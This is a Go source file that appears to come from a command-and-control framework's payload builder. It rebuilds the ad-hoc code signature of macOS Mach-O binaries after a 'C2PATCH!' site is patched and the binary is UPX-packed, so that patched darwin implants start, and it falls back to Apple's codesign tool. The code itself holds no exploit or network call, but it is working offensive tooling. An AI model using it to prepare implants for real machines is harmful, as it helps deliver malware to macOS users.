package payload

// Mach-O ad-hoc code signing for darwin payloads.
//
// macOS 11+ refuses to start an arm64 executable whose embedded signature no
// longer matches its bytes: the kernel sends SIGKILL at exec with no diagnostic
// on stderr. Patching the C2PATCH! site - and UPX packing - always invalidates
// that signature, so every darwin payload needs a fresh ad-hoc signature after
// the patch stage. A binary stripped of its signature is rejected just the same
// way, so "remove and hope the kernel signs it" is not an option.
//
// The signer below builds the structure the Go linker emits, byte for byte:
//
//	SuperBlob (0xfade0cc0) -> CodeDirectory (0xfade0c02, v0x20400)
//	flags 0x20002 = CS_ADHOC | CS_LINKER_SIGNED, SHA-256 page hashes
//
// Constraints, all verified against codesign on macOS:
//   - the signature covers [0, codeLimit) where codeLimit is the existing
//     LC_CODE_SIGNATURE.dataoff, i.e. everything before the signature blob
//   - the blob lives at codeLimit, and __LINKEDIT must grow to cover it
//   - page hashes are computed AFTER the load commands are rewritten, and the
//     final partial page is hashed unpadded
//
// hosts without codesign benefit from the same path, so a Linux cross-build now
// produces a darwin payload that actually starts.

import (
	"crypto/sha256"
	"encoding/binary"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

const (
	machMagic64     = 0xFEEDFACF // MH_MAGIC_64, little endian
	machMagic32     = 0xFEEDFACE
	lcSegment64     = 0x19
	lcCodeSignature = 0x1D

	codeSigMagic    = 0xFADE0CC0
	codeDirMagic    = 0xFADE0C02
	codeDirVersion  = 0x20400
	codeDirFixedLen = 88      // v0x20400 fixed header
	codeSigFlags    = 0x20002 // CS_ADHOC | CS_LINKER_SIGNED
	hashTypeSHA256  = 2
	pageSizeLog2    = 12 // 4096
	signPageSize    = 1 << pageSizeLog2
)

// signDarwin repairs the ad-hoc signature of a patched darwin binary. It reports
// whether the bytes changed and which strategy was used (for the technique list).
func signDarwin(b []byte, filename string) ([]byte, string, bool) {
	if out, ok := signAdhocMachO(b, identFor(filename)); ok {
		return out, "ad-hoc 重签（内置）", true
	}
	// Fall back to the platform tool for shapes the built-in signer declines
	// (fat binaries, 32-bit images, unusual load command layouts).
	if path, err := exec.LookPath("codesign"); err == nil {
		if out, ok := codesignAdhoc(path, b, filename); ok {
			return out, "ad-hoc 重签（codesign）", true
		}
	}
	return b, "", false
}

func identFor(filename string) string {
	name := strings.TrimSpace(filepath.Base(filename))
	if name == "" || name == "." || name == string(filepath.Separator) {
		return "payload"
	}
	name = strings.Map(func(r rune) rune {
		if r < 0x20 || r > 0x7e || r == '/' || r == '\\' {
			return -1
		}
		return r
	}, name)
	if name == "" {
		return "payload"
	}
	if len(name) > 64 {
		name = name[:64]
	}
	return name
}

// signAdhocMachO rewrites b with a fresh ad-hoc signature. It only handles thin
// 64-bit images that already carry an LC_CODE_SIGNATURE command, which is what
// Go (and Xcode) produce for darwin targets.
func signAdhocMachO(b []byte, ident string) ([]byte, bool) {
	le := binary.LittleEndian
	if len(b) < 32 || le.Uint32(b[0:]) != machMagic64 {
		return nil, false
	}
	ncmds := int(le.Uint32(b[16:]))
	if ncmds <= 0 || ncmds > 4096 {
		return nil, false
	}
	sigCmd, linkEdit := -1, -1
	off := 32
	for i := 0; i < ncmds; i++ {
		if off+8 > len(b) {
			return nil, false
		}
		cmd := le.Uint32(b[off:])
		size := int(le.Uint32(b[off+4:]))
		if size < 8 || off+size > len(b) {
			return nil, false
		}
		switch cmd {
		case lcCodeSignature:
			if size < 16 {
				return nil, false
			}
			sigCmd = off
		case lcSegment64:
			if strings.HasPrefix(string(b[off+8:off+24]), "__LINKEDIT") {
				linkEdit = off
			}
		}
		off += size
	}
	if sigCmd < 0 || linkEdit < 0 {
		return nil, false
	}

	codeLimit := int(le.Uint32(b[sigCmd+8:]))
	fileOff := int(le.Uint64(b[linkEdit+40:]))
	if codeLimit <= 0 || codeLimit > len(b) || fileOff < 0 || fileOff >= codeLimit {
		return nil, false
	}
	if ident == "" {
		ident = "payload"
	}

	nSlots := (codeLimit + signPageSize - 1) / signPageSize
	cdLen := codeDirFixedLen + len(ident) + 1 + nSlots*sha256.Size
	blobLen := 20 + cdLen
	fileSize := codeLimit + blobLen - fileOff
	if fileSize <= 0 {
		return nil, false
	}

	out := make([]byte, codeLimit)
	copy(out, b[:codeLimit])
	// The load commands must be final before hashing: LC_CODE_SIGNATURE lives in
	// page 0, so its new datasize changes the first page hash.
	le.PutUint32(out[sigCmd+8:], uint32(codeLimit))
	le.PutUint32(out[sigCmd+12:], uint32(blobLen))
	le.PutUint64(out[linkEdit+32:], uint64(roundUp(fileSize, signPageSize))) // vmsize
	le.PutUint64(out[linkEdit+48:], uint64(fileSize))                        // filesize

	hashes := make([]byte, 0, nSlots*sha256.Size)
	for start := 0; start < codeLimit; start += signPageSize {
		end := start + signPageSize
		if end > codeLimit {
			end = codeLimit
		}
		sum := sha256.Sum256(out[start:end])
		hashes = append(hashes, sum[:]...)
	}

	cd := make([]byte, codeDirFixedLen, cdLen)
	be := binary.BigEndian
	be.PutUint32(cd[0:], codeDirMagic)
	be.PutUint32(cd[4:], uint32(cdLen))
	be.PutUint32(cd[8:], codeDirVersion)
	be.PutUint32(cd[12:], codeSigFlags)
	be.PutUint32(cd[16:], uint32(codeDirFixedLen+len(ident)+1)) // hashOffset
	be.PutUint32(cd[20:], uint32(codeDirFixedLen))              // identOffset
	be.PutUint32(cd[24:], 0)                                    // nSpecialSlots
	be.PutUint32(cd[28:], uint32(nSlots))
	be.PutUint32(cd[32:], uint32(codeLimit))
	cd[36] = sha256.Size
	cd[37] = hashTypeSHA256
	cd[38] = 0 // platform
	cd[39] = pageSizeLog2
	be.PutUint32(cd[40:], 0) // spare2
	be.PutUint32(cd[44:], 0) // scatterOffset
	be.PutUint32(cd[48:], 0) // teamOffset
	be.PutUint32(cd[52:], 0) // spare3
	be.PutUint64(cd[56:], 0) // codeLimit64: 32-bit field above is authoritative
	be.PutUint64(cd[64:], 0) // execSegBase
	be.PutUint64(cd[72:], 0) // execSegLimit
	be.PutUint64(cd[80:], 0) // execSegFlags
	cd = append(cd, ident...)
	cd = append(cd, 0)
	cd = append(cd, hashes...)

	// One CodeDirectory blob is enough for an ad-hoc signature: that is exactly
	// what the Go linker emits, and codesign accepts it.
	sb := make([]byte, 20, blobLen)
	be.PutUint32(sb[0:], codeSigMagic)
	be.PutUint32(sb[4:], uint32(blobLen))
	be.PutUint32(sb[8:], 1)  // count
	be.PutUint32(sb[12:], 0) // index: type = CodeDirectory
	be.PutUint32(sb[16:], 20)
	sb = append(sb, cd...)
	if len(sb) != blobLen {
		return nil, false
	}
	out = append(out, sb...)
	return out, true
}

func roundUp(n, unit int) int {
	if unit <= 0 {
		return n
	}
	return (n + unit - 1) / unit * unit
}

// codesignAdhoc is the fallback for images the built-in signer declines.
func codesignAdhoc(codesign string, b []byte, filename string) ([]byte, bool) {
	dir, err := os.MkdirTemp("", "c2-sign-")
	if err != nil {
		return nil, false
	}
	defer os.RemoveAll(dir)
	path := filepath.Join(dir, "payload")
	if err := os.WriteFile(path, b, 0o700); err != nil {
		return nil, false
	}
	if out, err := exec.Command(codesign, "--force", "--sign", "-", "--timestamp=none", path).CombinedOutput(); err != nil {
		_ = out
		return nil, false
	}
	signed, err := os.ReadFile(path)
	if err != nil || len(signed) == 0 {
		return nil, false
	}
	return signed, true
}
